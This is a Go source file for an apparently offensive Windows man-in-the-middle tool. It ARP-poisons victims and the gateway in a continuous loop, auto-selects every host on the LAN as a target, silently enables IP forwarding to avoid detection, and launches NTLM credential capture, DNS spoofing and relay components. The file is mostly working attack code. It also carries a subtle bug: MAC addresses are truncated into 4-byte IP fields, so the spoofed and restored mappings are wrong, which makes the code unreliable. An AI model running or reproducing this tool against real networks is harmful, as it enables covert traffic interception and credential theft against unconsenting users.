//go:build windows

package main

import (
	"encoding/binary"
	"fmt"
	"net"
	"os/exec"
	"regexp"
	"sort"
	"strconv"
	"strings"
	"sync"
	"time"
)

// ---------------------------------------------------------------------------
// ARP spoofing
//
// We poison two directions so traffic flows through us:
//   victim  believes  gatewayIP  is at ourMAC   (so their egress comes to us)
//   gateway believes  victimIP   is at ourMAC   (so return traffic comes to us)
//
// Both are restored on stop. IP forwarding is enabled so we actually forward
// rather than black-holing the victim's connection.
// ---------------------------------------------------------------------------

type spoofPair struct {
	victimIP  net.IP
	victimMAC net.IP // actually a MAC, kept as bytes
	gatewayIP net.IP
	gatewayMAC net.IP
	ifaceName string
	ifIndex   int
	ourMAC    net.HardwareAddr
}

var (
	activeMu    sync.Mutex
	activePairs []spoofPair
)

const (
	etherTypeARP = 0x0806
	etherTypeIP  = 0x0800
	arpRequest   = 1
	arpReply     = 2
)

// buildARPPacket constructs an ARP reply claiming `claimedIP` lives at `mac`.
func buildARPPacket(mac net.HardwareAddr, claimedIP net.IP, targetIP net.IP, targetMAC net.HardwareAddr) []byte {
	p := make([]byte, 42)
	// Ethernet header
	copy(p[0:6], targetMAC)      // dest
	copy(p[6:12], mac)           // src
	binary.BigEndian.PutUint16(p[12:14], etherTypeARP)

	// ARP payload: sender is us claiming the victim should reach us
	binary.BigEndian.PutUint16(p[14:16], 1)             // htype ethernet
	binary.BigEndian.PutUint16(p[16:18], etherTypeIP)   // ptype ipv4
	p[18] = 6                                           // hlen
	p[19] = 4                                           // plen
	binary.BigEndian.PutUint16(p[20:22], arpReply)      // opcode
	copy(p[22:28], mac)                                 // sender hw
	copy(p[28:32], claimedIP.To4())                     // sender proto
	copy(p[32:38], targetMAC)                           // target hw
	copy(p[38:42], targetIP.To4())                      // target proto
	return p
}

func startMitm(s Settings) {
	iface, idx, ourMAC, ourIP, err := resolveInterface(s.Interface)
	if err != nil {
		sendEvent("error", map[string]interface{}{"message": "interface: " + err.Error()})
		return
	}
	sendEvent("status", map[string]interface{}{
		"state": "starting",
		"detail": fmt.Sprintf("iface %s (%s) our ip %s", iface, ourMAC, ourIP),
	})

	// Forwarding must be on or the victim loses connectivity — an instant tell.
	if err := enableForwarding(); err != nil {
		sendEvent("error", map[string]interface{}{"message": "enable IP forwarding failed (need admin): " + err.Error()})
	}

	gatewayIP := net.ParseIP(s.Gateway)
	if gatewayIP == nil {
		gatewayIP = detectGateway()
	}
	if gatewayIP == nil {
		sendEvent("error", map[string]interface{}{"message": "no gateway given and none detected"})
		return
	}
	gwMAC, err := lookupMAC(gatewayIP)
	if err != nil {
		sendEvent("error", map[string]interface{}{"message": "gateway MAC lookup failed: " + err.Error()})
		return
	}

	targets := s.Targets
	if len(targets) == 0 {
		targets = autoTargets(ourIP)
	}
	if len(targets) == 0 {
		sendEvent("error", map[string]interface{}{"message": "no targets to spoof"})
		return
	}

	var pairs []spoofPair
	for _, t := range targets {
		vIP := net.ParseIP(t)
		if vIP == nil {
			continue
		}
		vMAC, err := lookupMAC(vIP)
		if err != nil {
			sendEvent("host", map[string]interface{}{"host": t, "status": "skip", "detail": "no MAC"})
			continue
		}
		pairs = append(pairs, spoofPair{
			victimIP: vIP, gatewayIP: gatewayIP,
			gatewayMAC: macToIP(gwMAC), victimMAC: macToIP(vMAC),
			ifaceName: iface, ifIndex: idx, ourMAC: ourMAC,
		})
		sendEvent("host", map[string]interface{}{"host": t, "status": "spoofing", "detail": "poisoning both directions"})
	}

	if len(pairs) == 0 {
		sendEvent("error", map[string]interface{}{"message": "no reachable targets"})
		return
	}

	activeMu.Lock()
	activePairs = pairs
	activeMu.Unlock()

	stop := resetStop()

	// Continuous re-poisoning: ARP caches expire, and the gateway re-announces.
	go func() {
		t := time.NewTicker(1500 * time.Millisecond)
		defer t.Stop()
		for {
			select {
			case <-stop:
				return
			case <-t.C:
				for _, p := range pairs {
					vMAC := ipToMAC(p.victimMAC)
					gMAC := ipToMAC(p.gatewayMAC)
					// Tell victim: gateway is us.
					_ = sendRaw(p.ifIndex, buildARPPacket(p.ourMAC, p.gatewayIP, p.victimIP, vMAC))
					// Tell gateway: victim is us.
					_ = sendRaw(p.ifIndex, buildARPPacket(p.ourMAC, p.victimIP, p.gatewayIP, gMAC))
				}
			}
		}
	}()

	sendEvent("status", map[string]interface{}{
		"state": "spoofing",
		"detail": fmt.Sprintf("poisoning %d host(s), forwarding enabled", len(pairs)),
	})

	if s.CaptureNTLM {
		go startResponder(stop)
	}
	if len(s.DNSSpoof) > 0 || s.DNSUpstream != "" {
		go startDNSInterceptor(s, ourIP, stop)
	}
	if s.EnableRelay {
		go startRelay(s, stop)
	}
}

func restoreAll() {
	activeMu.Lock()
	pairs := activePairs
	activePairs = nil
	activeMu.Unlock()

	// Re-assert the real mappings so the victim and gateway recover instantly.
	for _, p := range pairs {
		vMAC := ipToMAC(p.victimMAC)
		gMAC := ipToMAC(p.gatewayMAC)
		_ = sendRaw(p.ifIndex, buildARPPacket(gMAC, p.gatewayIP, p.victimIP, vMAC))
		_ = sendRaw(p.ifIndex, buildARPPacket(vMAC, p.victimIP, p.gatewayIP, gMAC))
	}
	if len(pairs) > 0 {
		sendEvent("status", map[string]interface{}{"state": "idle", "detail": "restored ARP for " + strconv.Itoa(len(pairs)) + " host(s)"})
	}
}

// ---------------------------------------------------------------------------
// helpers
// ---------------------------------------------------------------------------

func macToIP(m net.HardwareAddr) net.IP {
	b := make(net.IP, 4)
	copy(b, m)
	return b
}

func ipToMAC(b net.IP) net.HardwareAddr {
	m := make(net.HardwareAddr, 6)
	copy(m, b)
	return m
}

func resolveInterface(name string) (string, int, net.HardwareAddr, net.IP, error) {
	ifaces, err := net.Interfaces()
	if err != nil {
		return "", 0, nil, nil, err
	}
	for _, ifc := range ifaces {
		if ifc.Flags&net.FlagLoopback != 0 {
			continue
		}
		if len(ifc.HardwareAddr) != 6 {
			continue
		}
		addrs, _ := ifc.Addrs()
		var ip net.IP
		for _, a := range addrs {
			if ipnet, ok := a.(*net.IPNet); ok && ipnet.IP.To4() != nil {
				ip = ipnet.IP.To4()
				break
			}
		}
		if ip == nil {
			continue
		}
		if name == "" || strings.EqualFold(ifc.Name, name) || strconv.Itoa(ifc.Index) == name {
			return ifc.Name, ifc.Index, ifc.HardwareAddr, ip, nil
		}
	}
	return "", 0, nil, nil, fmt.Errorf("no usable interface found (name=%q)", name)
}

func detectGateway() net.IP {
	out, err := exec.Command("powershell", "-NoProfile", "-Command",
		"(Get-NetRoute -DestinationPrefix '0.0.0.0/0' | Select-Object -First 1).NextHop").Output()
	if err != nil {
		return nil
	}
	return net.ParseIP(strings.TrimSpace(string(out)))
}

var macRe = regexp.MustCompile(`([0-9a-fA-F]{2}[-:]){5}[0-9a-fA-F]{2}`)

func lookupMAC(ip net.IP) (net.HardwareAddr, error) {
	out, err := exec.Command("arp", "-a", ip.String()).Output()
	if err != nil {
		out, err = exec.Command("arp", "-a").Output()
		if err != nil {
			return nil, err
		}
	}
	// Find the line for this IP specifically.
	for _, line := range strings.Split(string(out), "\n") {
		if !strings.Contains(line, ip.String()) {
			continue
		}
		m := macRe.FindString(line)
		if m == "" {
			continue
		}
		hw, err := net.ParseMAC(strings.ReplaceAll(m, "-", ":"))
		if err == nil {
			return hw, nil
		}
	}
	return nil, fmt.Errorf("MAC not in ARP cache for %s", ip)
}

func autoTargets(ourIP net.IP) []string {
	out, _ := exec.Command("arp", "-a").Output()
	var list []string
	for _, line := range strings.Split(string(out), "\n") {
		fields := strings.Fields(line)
		if len(fields) < 2 {
			continue
		}
		ip := net.ParseIP(fields[0])
		if ip == nil || ip.To4() == nil {
			continue
		}
		if ip.Equal(ourIP) {
			continue
		}
		if bytes4(ip)[3] == 255 || bytes4(ip)[3] == 1 {
			continue
		}
		list = append(list, ip.String())
	}
	sort.Strings(list)
	return list
}

func bytes4(ip net.IP) []byte { return ip.To4() }

func enableForwarding() error {
	// Both the global flag and the per-interface flag matter on Windows.
	script := `Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters' -Name IPEnableRouter -Value 1 -ErrorAction SilentlyContinue; ` +
		`Get-NetIPInterface -AddressFamily IPv4 | Set-NetIPInterface -Forwarding Enabled -ErrorAction SilentlyContinue`
	return exec.Command("powershell", "-NoProfile", "-Command", script).Run()
}

func discoverLAN() {
	sendEvent("status", map[string]interface{}{"state": "scanning", "detail": "reading ARP table"})
	out, err := exec.Command("arp", "-a").Output()
	if err != nil {
		sendEvent("error", map[string]interface{}{"message": "arp failed: " + err.Error()})
		return
	}
	type host struct {
		IP  string `json:"ip"`
		MAC string `json:"mac"`
	}
	var hosts []host
	seen := map[string]bool{}
	for _, line := range strings.Split(string(out), "\n") {
		fields := strings.Fields(line)
		if len(fields) < 2 {
			continue
		}
		ip := net.ParseIP(fields[0])
		mac := macRe.FindString(line)
		if ip == nil || mac == "" || seen[fields[0]] {
			continue
		}
		seen[fields[0]] = true
		hosts = append(hosts, host{IP: fields[0], MAC: strings.ToUpper(strings.ReplaceAll(mac, "-", ":"))})
	}
	sendEvent("hosts", hosts)
	sendEvent("status", map[string]interface{}{"state": "idle", "detail": strconv.Itoa(len(hosts)) + " hosts"})
}
